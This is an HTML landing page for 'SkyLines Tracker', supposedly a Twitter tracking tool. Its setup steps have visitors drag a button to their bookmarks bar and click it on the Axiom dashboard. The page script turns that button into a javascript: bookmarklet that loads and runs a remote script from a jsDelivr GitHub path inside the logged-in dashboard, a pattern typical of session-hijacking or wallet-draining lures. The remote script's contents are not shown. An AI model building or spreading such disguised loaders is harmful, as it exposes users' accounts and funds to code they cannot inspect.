<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SkyLines Tracker - Premier Twitter Tracker</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #0a0a0a; color: #e0e0e0; margin: 0; overflow-x: hidden; text-align: center; }
        canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.4; }
        header { padding: 100px 20px; background: linear-gradient(135deg, #1c0033, #4a0072); }
        .cta-button { display: inline-block; background: linear-gradient(135deg, #ab47bc, #7e57c2); color: white; padding: 16px 36px; text-decoration: none; border-radius: 8px; font-weight: 600; margin: 20px; box-shadow: 0 6px 20px rgba(171,188,0.4); cursor: move; }
        .setup-section { padding: 50px 20px; }
        ol { text-align: left; max-width: 500px; margin: 0 auto; line-height: 2; }
    </style>
</head>
<body>
    <canvas id="filamentCanvas"></canvas>
    <header>
        <h1>SkyLines Tracker</h1>
        <p>Advanced Twitter API tracking for Axiom workflows.</p>
    </header>

    <section class="setup-section">
        <h2>Setup Instructions</h2>
        <ol>
            <li>Drag the button below to your <b>Bookmarks Bar</b>.</li>
            <li>Go to the Axiom dashboard.</li>
            <li>Click the bookmark to activate optimization.</li>
        </ol>

        <a href="" class="cta-button" id="skylines-tool">SkyLines Tracker</a>
    </section>

    <script>
        // 1. Background Animation
        const canvas = document.getElementById('filamentCanvas');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        const filaments = [];
        for (let i = 0; i < 30; i++) {
            filaments.push({
                x: Math.random() * canvas.width,
                y: Math.random() * canvas.height,
                len: Math.random() * 100 + 50,
                angle: Math.random() * Math.PI * 2,
                speed: Math.random() * 1 + 0.5
            });
        }
        function draw() {
            ctx.clearRect(0,0,canvas.width,canvas.height);
            ctx.strokeStyle = '#ab47bc'; ctx.lineWidth = 1.5;
            filaments.forEach(f => {
                f.x += Math.cos(f.angle) * f.speed; f.y += Math.sin(f.angle) * f.speed;
                if(f.x < 0 || f.x > canvas.width) f.angle = Math.PI - f.angle;
                ctx.beginPath(); ctx.moveTo(f.x, f.y);
                ctx.lineTo(f.x + Math.cos(f.angle) * f.len, f.y + Math.sin(f.angle) * f.len);
                ctx.stroke();
            });
            requestAnimationFrame(draw);
        }
        draw();

        // 2. Bookmarklet Logic - Points to your GitHub
        const githubLink = "https://cdn.jsdelivr.net/gh/Jinxthesimp/assets@main/tracker.js";
        const code = "javascript:(function(){var s=document.createElement('script');s.src='" + githubLink + "?v=' + Date.now();document.body.appendChild(s);})();";
        
        document.getElementById('skylines-tool').href = code;
    </script>
</body>
</html>
